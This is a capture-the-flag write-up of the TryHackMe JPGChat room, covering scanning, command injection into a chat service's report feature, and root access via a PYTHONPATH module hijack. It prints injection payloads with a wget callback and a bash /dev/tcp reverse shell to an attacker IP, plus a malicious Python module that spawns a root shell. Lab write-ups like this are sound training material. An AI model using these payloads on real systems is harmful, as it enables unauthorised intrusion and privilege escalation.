# THM: JPGChat

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/jpg_chat/jpg_chat.png" alt="JPGChat" width="90"/> |
| Room | JPGChat |
| URL | https://tryhackme.com/room/jpgchat |
| Difficulty | Easy |

## Concepts/Tools Used

- Shell Injection
- PYTHONPATH

## Room Description

Exploiting poorly made custom chatting service written in a certain language...

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-22 18:27 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Initiating SYN Stealth Scan at 18:27
Scanning target.thm (10.10.17.157) [65535 ports]
Discovered open port 22/tcp on 10.10.17.157
Discovered open port 3000/tcp on 10.10.17.157
Completed SYN Stealth Scan at 18:27, 4.08s elapsed (65535 total ports)
Initiating Service scan at 18:27
Scanning 2 services on target.thm (10.10.17.157)
Completed Service scan at 18:27, 6.01s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.17.157.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.19s elapsed
Initiating NSE at 18:27
Completed NSE at 18:27, 0.02s elapsed
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Nmap scan report for target.thm (10.10.17.157)
Host is up (0.00085s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, NULL:
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=7/22%Time=687FC9F3%P=x86_64-pc-linux-gnu%r(NU
SF:LL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\x20
SF:service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMESSAG
SF:E\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(currentl
SF:y\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\x20
SF:report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(Gen
SF:ericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20t
SF:his\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\
SF:nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(c
SF:urrently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x2
SF:0to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.24 seconds
           Raw packets sent: 65538 (2.884MB) | Rcvd: 65535 (2.621MB)
```

## Establish a foothold and get user.txt

Looking at the output above, I do a google search for JPChat. I found [this repository](https://github.com/Mozzie-jpg/JPChat) for this room.

Looking at the code, I see that it doesn't validate or sanitize user input. This means that I can get this to run code if I provide the right payload. I want to test some payloads so I start a listener on port 8000. The goal is for the payload to call this listener.

```bash
$ nc -lvnp 8000
```

When I report a user, the server code takes my input and echos that to a file. They ask for a username as input and then a description of what the user did. I will send my payload for the username and nothing as the description since it doesn't validate input.

I am going to make a wget request to prove that this is vulnerable. I will have it echo hello and then run my command. I provide the following payload:

```bash
'hello' && wget http://<attack_machine_ip>:8000/404.py
```

I check the listener and it had the following:

```bash
Connection received on target.thm 60808
GET /404.py HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: <attack_machine_ip>:8000
Connection: Keep-Alive
```

That worked, I change the listener to port 4444. The port number doesn't matter, 4444 is a preference that I have. It is the first port number that like to use when I get a foothold on a machine.

```bash
$ nc -lnvp 4444
```

The first payload I used was the following:

```bash
'hello' && bash -i >& /dev/tcp/<attack_machine_id>/4444 0>&1
```

My shell was having issues. I wasn't seeing output from my commands. I disconnected and restarted my listener. I ran the following payload:

```bash
'hello' && bash -i >& /dev/tcp/10.103.66.16/4444 0>&1 || id
```

The || id will ignore the rest of the command so it will echo hello and then connect to my attack machine.

I have a shell. I'm in!

I see that I am the user wes. I go to /home/wes and look for the flag:

```bash
$ cd /home/wes
$ ls
user.txt
$ cat user.txt
REDACTED
```

## Escalate your privileges to root and read root.txt

I run my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation), `sudo -l` didn't disappoint:

```bash
$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

I can't modify the python3 binary and I can't modify the test_module.py file. The test_module.py has the following lines:

```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

This code is importing from the compare module. I can create my own compare module, reference with the PYTHONPATH variable and then I'll have a shell. The PYTHONPATH variable is used by python to point to any custom modules a user would like to use.

In this case, since I can modify it for the user wes, I can create a compare module that will create a new shell. Since I am running python with sudo, I will have a root shell.

I start by setting the PYTHONPATH variable to point to another directory. Any directory will work I just need write permissions to create a folder and a file in the folder. I decide to use the home directory of wes:

```bash
$ export PYTHONPATH=/home/wes
```

Then I create a folder called compare with a file called __init__.py in the /home/wes directory:

```bash
$ cd /home/wes
$ mkdir compare
$ touch compare/__init__.py
```

This is how one way modules work in python. In this case, there is a folder that is the name of the module and then inside the folder the __init__.py (notice the double underscores) file is the entry point of the module.

I put the following text in the __init__.py file that was just created:

```python
import os
os.system('/bin/bash')


def Str(a, b, c):
    return False
```

The Str function is there because that is what the test_module.py is calling. It won't actually hit that code before I have a root shell but I included it to help understand where the module hijacking it taking place.

I run the command and get a root shell:

```bash
$ sudo /usr/bin/python3 /opt/development/test_module.py
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

I run the following to get the root.txt flag:

```bash
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
REDACTED

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
```
